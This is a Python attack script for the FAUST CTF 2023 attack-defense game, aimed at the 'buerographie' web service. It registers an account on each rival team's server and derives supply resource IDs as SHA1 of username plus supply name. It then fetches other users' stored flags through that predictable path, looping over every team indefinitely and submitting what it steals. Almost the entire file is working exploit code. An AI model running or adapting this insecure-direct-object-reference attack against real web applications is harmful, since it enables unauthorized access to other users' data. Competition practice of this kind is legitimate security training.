#!/usr/bin/env python3
from pwn import *
import requests
import re
import functools
import json
from Crypto.Hash import SHA1


YEAR = 2023
TEAM_NUMBER = 48
SERVICE_NAME = 'buerographie'
SERVICE_PORT = 13731

FLAG_FORMAT = r'FAUST_[A-Za-z0-9\/+]{32}'
TEAMS_URL = f'https://{YEAR}.faustctf.net/competition/teams.json'
OWN_ADDRESS = f'fd66:666:{TEAM_NUMBER}::2'
OWN_NUM = f'fd66:666:{48}::2'
SUBMISSION_URL = 'submission.faustctf.net'
SUBMISSION_PORT = 666

# exploit dependent variables
context.log_level = 'INFO' # 'DEBUG' | 'INFO' | 'CRITICAL'
context.timeout = 2
context.arch = 'amd64'

all_flags = set()

# @all_flags: previously submitted flags
# @current_flags: flags acquired in the current round
# @return an updated set of previously submitted flags
def submit_flags(all_flags, current_flags):
    with remote(SUBMISSION_URL, SUBMISSION_PORT) as p:
        flags = current_flags - all_flags
        print(p.recvline())
        print(p.recvline())
        print(p.recvline())
        for flag in flags:
            p.sendline(flag)
            resp = p.recvline().strip()
            success(f"{flag} - {resp}")
            all_flags.update(flag)
    return all_flags

# @return: list of target IPs as strings
def get_targets():
    targets = requests.get(TEAMS_URL).json()
    # based on FAUST2021
    # TODO: update IP format string
    target_nums = targets["teams"]
    flag_ids = targets["flag_ids"][SERVICE_NAME]
    return target_nums, flag_ids

def parse(json_str):
    return json.loads(json_str)

def random_string(N):
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# @terget_ip: The address of a machine to exploit
# @flag_ids: All flag IDs returned by the API
# @return: set() of flags acquired
def pwn(target_num, flag_ids):
    flags = set()
    target_flag_ids = flag_ids[str(target_num)]
    vulnbox_ip = f"fd66:666:{target_num}::2"
    # print(vulnbox_ip)
    username = random_string(10)
    password = "asd"
    s = requests.session()
    s.request = functools.partial(s.request, timeout=3)
    register = s.post(f'http://[{vulnbox_ip}]:{SERVICE_PORT}/register', data={'user': username, 'pass': password, 'pass2': password, 'submit': 'sign+up'})
    login = s.post(f'http://[{vulnbox_ip}]:{SERVICE_PORT}/login', data={'user': username, 'pass': password})
    """ print(login.text.strip()) """
    for user_str in target_flag_ids:
        user = parse(user_str)
        # print(user)
        h = SHA1.new()
        concat = user["username"] + user["supplyname"]
        bytes = str.encode(concat)
        h.update(bytes)
        hash = h.hexdigest()
        #print(user_str)
        #print(concat)
        #print(bytes)
        #print(hash)
        files = {'file': ('hello.txt',open('hello.txt', 'rb'))}
        #upload = s.post(f'http://[{vulnbox_ip}]:{SERVICE_PORT}/staff/supply', files=files)
        body = "-----------------------------391418286728717679571936256495\r\nContent-Disposition: form-data; name=\"supply\"; filename=\"text.txt\"\r\nContent-Type: text/plain\r\n\r\nhello world\n\r\n-----------------------------391418286728717679571936256495\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nupload\r\n-----------------------------391418286728717679571936256495--\r\n"
        upload = s.post(f'http://[{vulnbox_ip}]:{SERVICE_PORT}/staff/supply', data=body, headers={
            "Content-Type": "multipart/form-data; boundary=---------------------------391418286728717679571936256495"
        })
        # print(upload.text.strip())
        getflags = s.get(f'http://[{vulnbox_ip}]:{SERVICE_PORT}/staff/supply/{hash}')
        flag = getflags.text.strip()
        if flag.startswith("FAUST_"):
            flags.update([flag])
            print(flag)
    return flags


def main():
    target_nums, flag_ids = get_targets()
    target_nums = target_nums
    random.shuffle(target_nums)
    global all_flags
    while True:
        for target in target_nums:
            if target == OWN_NUM:
               continue
            info(f'Attacking: {target}')
            try:
                flags = pwn(target, flag_ids)
            except Exception as e:
                log.critical(f'{e}')
                continue

            # submit flags and update acquired flags
            all_flags = submit_flags(all_flags, flags)


if __name__ == '__main__':
    main()
